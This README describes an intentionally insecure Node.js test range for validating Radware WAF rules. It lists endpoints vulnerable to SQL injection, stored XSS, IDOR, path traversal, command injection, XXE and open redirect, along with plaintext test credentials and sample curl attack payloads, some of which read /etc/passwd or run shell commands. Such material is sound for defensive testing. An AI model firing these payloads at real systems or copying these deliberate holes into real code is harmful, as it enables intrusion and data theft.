# waf-test-range

**Intentionally insecure security testing target** for validating Radware WAF/CSMS detection and tuning CWAF policies.

> **WARNING:** This application has **zero security controls by design** — no input validation, no authentication middleware, no rate limiting, no output encoding, no file sanitization. **Only run behind a WAF** (Radware CWAF/CSMS) in a **network-restricted** internal environment. Never expose to the public internet without WAF protection.

## Quick start

```bash
cd waf-test-range
npm install
npm start
```

Server listens on `http://localhost:3000` (or `process.env.PORT`).

Health check: `curl http://localhost:3000/health`

## Static pages

| Page | URL |
|------|-----|
| Home | `/index.html` |
| About | `/about.html` |
| Login | `/login.html` |
| Search | `/search.html` |
| Upload | `/upload.html` |
| Profile | `/profile.html` |
| Comments | `/comments.html` |
| Robots | `/robots.txt` |
| Sitemap | `/sitemap.xml` |

## API endpoints

| Method | Endpoint | Purpose |
|--------|----------|---------|
| GET | `/health` | Uptime check |
| GET | `/api/search?q=` | Product search (SQLi pattern logging) |
| POST | `/api/login` | Plaintext credential check |
| POST | `/api/comments` | Store comment (no sanitization) |
| GET | `/api/comments` | List all comments |
| GET | `/api/users/:id` | Full user object incl. password (IDOR) |
| POST | `/api/upload` | Unrestricted file upload |
| GET | `/api/file?name=` | Path traversal file read |
| GET | `/api/ping?host=` | Command injection via shell ping |
| GET | `/api/products?id=` | Product by ID (SQLi pattern logging) |
| POST | `/api/feedback` | XML body parse (XXE testing) |
| GET | `/api/redirect?url=` | Open redirect |

Hardcoded test users (plaintext passwords in `data/users.js`):

| Username | Password |
|----------|----------|
| admin | admin123 |
| testuser | password1 |
| alice | alice2024 |
| bob | bob123 |
| guest | guest |

---

## Example curl requests

Replace `BASE` with your deployment URL (e.g. `http://localhost:3000`).

### Legitimate requests

```bash
# Health
curl "$BASE/health"

# Search
curl "$BASE/api/search?q=widget"

# Login
curl -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Post comment
curl -X POST "$BASE/api/comments" \
  -H "Content-Type: application/json" \
  -d '{"name":"Alice","comment":"Nice product!"}'

# User lookup
curl "$BASE/api/users/1"

# Product detail
curl "$BASE/api/products?id=1"

# Read seeded file
curl "$BASE/api/file?name=readme.txt"

# Upload
curl -X POST "$BASE/api/upload" -F "file=@./files/readme.txt"
```

### Malicious payloads (for WAF rule validation)

```bash
# SQL injection — search
curl "$BASE/api/search?q=' OR 1=1--"

# SQL injection — login auth bypass pattern
curl -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"x"}'

# SQL injection — products
curl "$BASE/api/products?id=1 OR 1=1"

# Stored XSS — comments
curl -X POST "$BASE/api/comments" \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","comment":"<script>alert(1)</script>"}'
# Then visit /comments.html to see innerHTML rendering

# IDOR — enumerate users
curl "$BASE/api/users/2"

# Path traversal — file read
curl "$BASE/api/file?name=../package.json"
curl "$BASE/api/file?name=../../etc/passwd"

# Command injection — ping
curl "$BASE/api/ping?host=127.0.0.1;id"
curl "$BASE/api/ping?host=8.8.8.8%26%26whoami"

# XXE — feedback XML
curl -X POST "$BASE/api/feedback" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><msg>&xxe;</msg></root>'

# Open redirect
curl -I "$BASE/api/redirect?url=https://evil.example/phish"

# Malicious upload (any extension)
echo '<script>alert(1)</script>' > /tmp/xss.html
curl -X POST "$BASE/api/upload" -F "file=@/tmp/xss.html"
curl "$BASE/uploads/xss.html"
```

---

## Security controls intentionally absent

Confirmed: this codebase contains **no**:

- Input validation or sanitization
- Authentication / authorization middleware
- Rate limiting or account lockout
- CAPTCHA
- Output encoding (comments use `innerHTML`)
- File type or size restrictions
- Filename sanitization
- Path traversal protection
- Command injection filtering
- XML hardening (entity expansion not disabled)
- Redirect allowlists

---

## Deploy to InsForge (compute)

This is a **Node.js server**, not a static site. Use **InsForge Compute** (container on Fly.io), not frontend/Vercel deployments.

### Prerequisites

1. InsForge CLI authenticated: `npx @insforge/cli login`
2. Project linked: `npx @insforge/cli link --project-id <your-project-id>`
3. `flyctl` on PATH (for source-mode deploy): `curl -L https://fly.io/install.sh | sh`

### Deploy steps

```bash
cd waf-test-range

# 1. Verify InsForge project
npx @insforge/cli current

# 2. Deploy container (Dockerfile included, listens on port 3000)
npx @insforge/cli compute deploy . \
  --name waf-test-range \
  --port 3000 \
  --region iad

# 3. Confirm service is running
npx @insforge/cli compute list
```

### Public URL pattern

After deploy, InsForge exposes the service at:

```
https://waf-test-range-<projectId>.fly.dev
```

Example (replace `<projectId>` with your InsForge project UUID):

```
https://waf-test-range-f52b7048-e549-4577-96ba-dd4a4d20f3ef.fly.dev
```

Verify:

```bash
curl https://waf-test-range-<projectId>.fly.dev/health
```

### Onboard into Radware CSMS

1. Point your WAF origin/backend to the Fly.dev URL above (or a custom domain CNAME to it).
2. In CSMS, add the domain as a protected application.
3. Run the curl test payloads above through the WAF to validate detection rules.
4. Restrict network access — allow only WAF egress to the origin, block direct public access if possible.

### Update / redeploy

```bash
npx @insforge/cli compute deploy . --name waf-test-range --port 3000
```

### Troubleshooting

```bash
npx @insforge/cli compute list
npx @insforge/cli compute events <service-id>
npx @insforge/cli diagnose
```

If compute is not enabled on your project, the CLI returns `COMPUTE_SERVICE_NOT_CONFIGURED` — contact InsForge support or use the dashboard to enable compute.

---

## Project structure

```
waf-test-range/
  server.js           # Express entry point (warning banner at top)
  package.json
  Dockerfile          # For InsForge compute deploy
  routes/api.js       # All vulnerable API routes
  data/users.js       # Plaintext users
  data/products.js    # Product catalog
  files/              # Sample files for /api/file
  uploads/            # Uploaded files (created at runtime)
  public/             # Static HTML, CSS, JS
```

## License / use

Authorized internal security testing only. Do not use against systems you do not own or have explicit permission to test.
